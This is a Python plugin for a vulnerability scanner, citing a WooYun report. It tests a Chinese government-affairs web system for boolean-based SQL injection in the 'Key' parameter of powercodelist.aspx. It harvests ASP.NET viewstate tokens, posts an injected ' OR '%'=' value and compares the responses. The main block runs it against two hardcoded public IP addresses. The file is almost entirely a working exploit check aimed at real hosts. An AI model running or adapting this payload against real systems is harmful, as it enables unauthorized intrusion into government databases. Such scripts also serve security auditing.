#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 南京擎天政务系统SQL注入(四)
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2015-0100245
description:
    powercodelist.aspx parameter:Key
    可以用union，但不同版本union查询的列数可能不同(又TM不同)，所以这里用bool来判断
    这个写一块儿确实有难度，不要喷
'''

import time
import re

def assign(service, arg):
    if service == 'skytech':
        return True, arg

def audit(arg):
    url = arg + 'webpages/application.aspx'
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    proxy = ('127.0.0.1', 8887)
    #获取网页参数
    code, head, res, err, _ = curl.curl2(url)
    if(code != 200):
        return False
    m = re.search(r'href="(powercodelist\.aspx\?q=[a-z0-9%]*)"', res)
    if not m:
        return False
    url = arg + 'webpages/' + m.group(1)
    #获取viewstate等
    code, head, res, err, _ = curl.curl2(url)
    if code != 200:
        return False
    m = re.search(r'id="__VIEWSTATE"\s*value="([a-zA-Z0-9+/=]*)"',res)
    #print res
    if not m:
        viewstate = ''
    else:
        viewstate = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__EVENTVALIDATION"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        eventvalidation = ''
    else:
        eventvalidation = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__VIEWSTATEGENERATOR"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        viewstategenerator = ''
    else:
        viewstategenerator = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    #构造post表单
    payload = 'asasasasasasasas'
    post = '__EVENTTARGET=Btn_Search&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&Key={payload}'.format(
        viewstate = viewstate,
        viewstategenerator = viewstategenerator,
        eventvalidation = eventvalidation,
        payload = payload
    )
    post_true = post.replace('asasasasasasasas', 'asasasasasasasas%27+OR+%27%25%27%3D%27')
    code, head, res_false, err, _ = curl.curl2(url, post=post, referer=url, header=content_type)
    if code != 200:
        return False
    code, head, res_true, err, _ = curl.curl2(url, post=post_true, referer=url, header=content_type)
    #bool注入的匹配模式
    pattern = re.compile(r'href=\'powercodeshow\.aspx\?q=[a-z0-9%]*\'\s*class=\'c\'')
    if pattern.search(res_true) and (not pattern.search(res_false)):
        security_hole('SQL Injection: ' + url + ' Parameter:Key')
    

if __name__ == '__main__':
    from dummy import *
    audit(assign('skytech', 'http://58.222.202.135:81/')[1])
    audit(assign('skytech', 'http://61.178.185.50/mqweb/')[1])